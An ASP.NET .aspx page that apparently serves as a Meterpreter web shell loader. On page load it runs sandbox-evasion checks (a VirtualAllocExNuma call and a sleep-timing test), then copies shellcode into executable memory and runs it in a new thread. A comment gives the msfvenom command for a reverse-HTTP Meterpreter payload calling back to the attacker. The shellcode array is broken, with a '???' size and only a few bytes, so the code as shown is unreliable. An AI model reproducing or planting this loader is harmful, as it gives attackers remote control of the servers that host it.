<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<script runat="server">
    private static Int32 MEM_COMMIT=0x1000;
    private static IntPtr PAGE_EXECUTE_READWRITE=(IntPtr)0x40;

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr VirtualAlloc(IntPtr lpStartAddr,UIntPtr size,Int32 flAllocationType,IntPtr flProtect);

    [System.Runtime.InteropServices.DllImport("kernel32")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes,UIntPtr dwStackSize,IntPtr lpStartAddress,IntPtr param,Int32 dwCreationFlags,ref IntPtr lpThreadId);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    private static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern IntPtr GetCurrentProcess();

    [System.Runtime.InteropServices.DllImport("kernel32.dll")]
    private static extern void Sleep(uint dwMilliseconds);

    protected void Page_Load(object sender, EventArgs e)
    {
        IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
        if(mem == null)
        {
            return;
        }

        var rand = new Random();
        uint dream = (uint)rand.Next(10000, 20000);
        double delta = dream / 1000 - 0.5;
        DateTime before = DateTime.Now;
        Sleep(dream);
        if (DateTime.Now.Subtract(before).TotalSeconds < delta)
        {
            return;
        }
	//msfvenom -p windows/x64/meterpreter/reverse_http LHOST=tun0 LPORT=8080 -f aspx -o shell.aspx
        byte[] vL8fwOy_ = new byte[???] { 0xc3,0x58,0x6a,0x00,0x59,0x49,0xc7,0xc2,0xf0,0xb5,0xa2,0x56,0xff,0xd5 };

        IntPtr uPR9CPj_b7 = VirtualAlloc(IntPtr.Zero,(UIntPtr)vL8fwOy_.Length,MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        System.Runtime.InteropServices.Marshal.Copy(vL8fwOy_,0,uPR9CPj_b7,vL8fwOy_.Length);
        IntPtr graLqi = IntPtr.Zero;
        IntPtr vn4FD0Agd = CreateThread(IntPtr.Zero,UIntPtr.Zero,uPR9CPj_b7,IntPtr.Zero,0,ref graLqi);
    }
</script>
